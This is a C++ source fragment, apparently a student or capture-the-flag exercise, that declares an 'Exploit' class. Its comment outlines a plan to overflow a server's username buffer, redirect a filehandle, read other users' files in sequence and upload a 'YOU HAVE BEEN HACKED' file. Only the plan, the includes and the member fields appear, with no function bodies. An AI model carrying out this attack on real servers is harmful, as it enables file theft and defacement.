/*
This program steals the secrets from the server.

1. creates new user
1b. stores !!!LAST!!! in to its intended filehandle, the largerst one.
2. updates username overflowing username buffer to alter filehandle.
3. logs back in to get contents from filehandle.
4. logs off with YOU HAVE BEEN HACKED in local temp.txt file to unpload to server.
5. repeats 2,3,4 for handle userN.txt for N from 1 until..
6. file contents retruned are !!!LAST!!!

*/

#include <cstdint>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>
#include <string>
#include <netdb.h>
#include <sstream>
#include <iomanip>
#include <stdio.h>
#include <string.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <cstring>
#include <cerrno>
#include "log.cpp"
#include <algorithm>

class Exploit{
    
public:

    Exploit(std::string hostname, uint16_t port);
    ~Exploit();
    void run();
    void connect_to_server();
    void execute_command();
    void create_user();
    void modify_handle();
    void get_secret();
    void store_secret();
    void notify_hacked();

private:

    int m_clientSocket;
    uint16_t m_port;
    std::string m_ipaddr;
    char m_recv[4096];
    char m_send[4096];
    ssize_t m_bytesRecv = 0;
    ssize_t m_bytesSent = 0;
    std::string m_username = "hacker";
    std::string m_password = "buckleup";
    std::string m_handle = "user1.txt";
    std::string m_command;
    std::string m_response;
    std::filesystem::path m_secret = "./Secret"; 
    bool m_more_secrets = true;
    std::filesystem::path m_secrets = "./Secrets";
    std::string m_path = "./Secrets/";
    const char* m_handlePre = "user";
    const char* m_handlePost = ".txt";
    char m_numHacked = 1;
    
};